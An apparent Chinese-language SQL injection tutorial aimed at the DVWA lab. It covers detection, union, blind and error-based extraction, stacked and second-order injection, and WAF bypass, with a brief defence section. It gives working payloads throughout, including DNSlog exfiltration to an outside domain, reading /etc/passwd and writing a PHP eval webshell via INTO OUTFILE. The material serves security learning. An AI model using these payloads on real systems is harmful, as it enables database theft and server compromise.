概述

SQL注入漏洞的本质就是通过恶意字符的拼接，导致sql语句产生歧义，凡是与数据库交互的地方都有可能存在sql注入点。

判断和利用思路

判断

  • 根据页面响应情况判断 Xxx.com/sqli/?id=1 能正常显示。 Xxx.com/sqli/?id=1‘ and 1=1 # 也能正常显示。 Xxx.com/sqli/?id=1’ and 1=2 # 不能正常显示页面。
  • 根据页面响应时间判断 Xxx.com/sqli/?id=1’ and sleep（5） 内容5秒后才出现页面。
  • 根据页面报错信息判断 Xxx.com/sqli/?id=1‘ 故意拼接错误的sql语句，看是否会在页面产生数据库的报错信息。

利用

Sql显注利用思路：

  1. 首先先对漏洞进行判定，判定结果为真。
  2. 拼接order by X 对查询字段的数量进行判定。
  3. 然后使用union select 1，2……n 去找数据的页面回显位置。
  4. 用内置函数user(),及database()，version()注入得出连接数据库用户以及数据库名称。要根据不同的数据库，选用相应的函数。
  5. 若是mysql数据库，并且数据库版本在5.0以上，存在information_schema库。
  6. union select 1,schema_name from information_schema.schemata 拿库名 union select 1,table_name from information_schema.tables where table_schema= ‘dvwa’ 拿表名 union select 2,column_name from information_schema.columns where table_schema= ‘dvwa’ and table_name= ‘users’ 拿列名 union select user,password from dvwa.users
  7. 补充：拿数据时可能会受到编码，格式等情况影响，导致拿不来数据，可以使用HEX()函数对数据进行编码拿出来，也可以使用group_concat()函数把数据合并后拿出来。

Sql布尔型盲注：

  1. 先判定
  2. 拼接 and length(user())>20 根据界面确定长度
  3. 拼接and substring(user(),1,1)=‘a’ 确定每个字的内容，依次确定每一个值
  4. 还是利用information_schema库，拼接 and (select count(schema_name) from information_schema.schemata) =6
  5. length((select schema_name from information_schema.schemata limit 0,1))=18 and substring((select schema_name from information_schema.schemata limit 0,1),1,1)=‘i’
  6. 之后的逻辑就是先判断长度，然后再每个字进行爆破。

Sql时间性盲注：

  1. 先判定
  2. 操作逻辑是and if(length(database())>1,sleep(5),1) 也是先判断长度，然后在每个进行测试，和布尔型一致。

SQL注入类型

数字型注入

数字型注入的特点： 1.在拼接SQL语句时传参并不需要””或’’ 进行闭合，因此在构造sql语句时不能用” 或’ 的方式判断回显来确定sql注入点，构造语句时应直接使用and 1=1 # 来判断。 select email from member where id=$id 2. 1和1asfaf是等效的，数据库进行语句处理时会将1后的asfaf过滤掉。

字符注入 

select email from member where id=“$id“
如上所示，按常规的语句拼接就行了。

利用dnslog进行辅助注入

具体实施过程参考此链接：https://xz.aliyun.com/t/9747

前置知识：

    1. dnslog平台：dnslog平台是提供dns解析日志的平台
    2. Mysql读文件函数— load_file() :可读取文件内容并执行。
    3. Dnslog平台的一些特性：假如有一个二级域名fff.cn 输入ashajfbak.fff.cn也会由于泛解析到fff.cn的ip。

原理:

    dns服务器收到请求进行解析时，会产生相应的日志。利用mysql数据库中的读文件机制，通过常规注入的方式传入特意构造好的域名，使得这个数据库服务器进行dns解析。
	    如：1‘ and select load_file(concat（“\\\\”,database(),”.asda.fsec.io”）) #
				Concat函数拼接后的效果是：\\dvwa. asda.fsec.io
				\\是unc路径的符号,为什么要写四个\呢，因为其中两个\表示转义符。

局限性：

    1.要求这台数据库服务器可以连接外网。
    2.这台数据库服务器要配置dns服务器。
    3.开启了load_file()函数的使用。
    4.因为用到了unc路径，所以仅适用于windows平台。
    5.仅限于mysql数据库

结论：

    1.用于辅助sql盲注，提升注入效率。
    2.使用条件苛刻，实际场景几乎很难遇到。

报错注入

原理：

利用错误的语法，将攻击者想看到的东西通过报错的形式显示出来。

使用条件：

只有当有报错回显时才能使用

利用xpath语法错误进行注入

主要利用extractvalue和updatexml两个函数。

使用条件：mysql版本>5.1.5

Extravalue函数介绍

正常语法：extractvalue(xml_document,Xpath_string);
第一个参数：xml_document是string格式，为xml文档对象的名称
第二个参数：Xpath_string是xpath格式的字符串
作用：从目标xml中返回包含所查询值的字符串

报错原理：
    第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，将查询结果放在报错信息里，报错信息会和查询结果一起显示在页面上。

利用方法：

id=" and (select extractvalue("anything",concat('~',(注入语句))))
id=" and(select extractvalue(1,concat('~',(select database()))))
id=" and(select extractvalue(1,concat(0x7e,@@version)))

注意事项：
    1. 0x7e  是~的asccii码
    2. concat(‘a’,‘b’)=“ab”
    3. version()=@@version
    4. ‘~‘可以换成’#’、’$'等不满足xpath格式的字符
    5. extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位。

updatexml函数介绍（与extractvalue函数基本一致）

比起上一个函数，多了一个传参。
方法：
id='and(select updatexml("anything",concat('~',(注入语句)),"anything"))
具体实施：
and (select updatexml(1,concat('~',(select database())),1))
脱库步骤：
" and (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
' and (select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))
" and (select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))

利用主键重复报错进行注入

原理是通过concat+rand()+group_by()导致主键重复。数据库会报错然后将查询结果返回。

二阶注入（过于罕见）

原理：先在数据库中埋入一个恶意数据，然后利用埋入的恶意数据去进行操作。

修改密码的sql语句Update passwd=’$pass’ where username=’$uname’ and passwd=’$p’;

先注册一个admin‘#用户 然后修改此用户的密码，拼接到sql语句中是，如下 Update passwd=$pass where username=’admin’# and passwd=$p; 此时修改的是admin的账户的密码。

宽字节注入

利用数据库采用gbk编码时所产生的漏洞。

堆叠注入

不同sql语句可以用；隔开（效果等于与用#和–将sql语句注释掉），堆叠注入就是利用这个特性，在分号后面构造自己想要执行的sql语句。 如 ：1’;update users set password=‘123456’ where username=‘Dumb’;–+

SQL注入读文件

利用load_file()函数可以读取数据库有权限读取的文件

如：1' and 1=2 union select 1,load_file('/etc/passwd');#

SQL注入写文件

利用info outfile函数可以在数据库有写权限的目录写入文件

1' and 1=2 union select user,password from users into outfile '/var/www/dvwaplus/1.bak'#

Into outfile 表示把查询的内容写到一个文件里，然后通过web路径的方式将文件下载到本地。当然，前提是执行sql语句的这个用户（通常数据库的用户是mysql，不具备在www目录下写入的权限）有权限去在www目录下写入文件。

写入webshell 

1' and 1=2 union select 1,'<?php @eval($_POST[123])?>' into outfile '/var/www/dvwaplus/tq.php'#

或利用sqlmap --os-shell获取shell。

前提：

  1. 知道并可以访问写入路径
  2. 写入路径具有执行权限
  3. 未进行站库分离

防御思路

  1. 在架构层面布置waf，并且数据库进行权限分离，某个应用系统仅能访问与之对应的数据库，这样就不会产生因一个网站产生sql注入漏洞，导致其他网站的数据库被盗取。
  2. 在系统权限层面，只有apache用户能对web目录有最高权限，其他用户不能有任何权限，这样就不会产生通过sql注入写入木马的问题。
  3. 在代码层面，即使对漏洞进行发现与修复。

防护绕过思路

大小写和双写绕过（过于低级）

可以使用大小写和双写的方式，这种绕过只能是对于代码层面的绕过，对于waf来说几乎是不可能。

编码绕过

多次url编码

    这种方式的原理是基于服务器收到后会对其进行解码。如果网站具备防御机制，则会对解码后的内容进行规则匹配。然而一些程序在执行了过滤之后还会执行一次不必要的解码。
    例如：
    1%2527%20and%201%253d1%23,这条字符在会被解码为：1%27 and 1%3d1#，其中没有'和=，假设这样就不会触发某些防御规则，然而当waf放过这串字符后，网站程序又会执行一次不必要的解码，再次解码后文本变成如此：1' and 1=1#，这一条将被数据库执行。

十六进制编码

在sql语句中dvwa字符串的十六进制编码后为0x64767761，均可被数据库识别

    'and 1=2 union select 1,table name from information schema,tables where table schema= 'dvwa'#
    1'and 1-2 union select 1,table name from information schema.tables where table schema= 0x64767761#

Char()函数绕过

使用ascii编码的方式绕过，例如，Char (65)=“A”。

注释的方式进行绕过（仅针对于对空格的过滤）

1’ and 1=2 union//select 1,2 # 原理是//会被识别成空格(/**/是SQL语句中注释的语法)

内联注入的方式绕过

原理就是通过注释和乱七八糟的符号组合，达成扰乱防护的目的，从而进行绕过。

具体操作过程见此链接：https://blog.csdn.net/qq_36282328/article/details/104015776

原本你想输入1’ and 1=2 UNION SELECT 1,2 #但是被防火墙过滤 可以使用以下进行绕过。

1’ and 1=2 /!UNION/ /!SELECT/ 1,2#

等价语句替换绕过

使用作用相同的函数替换

sleep() 与 benchmark()

concat_ws() 与 group_concat()

mid()=substr()=substring()
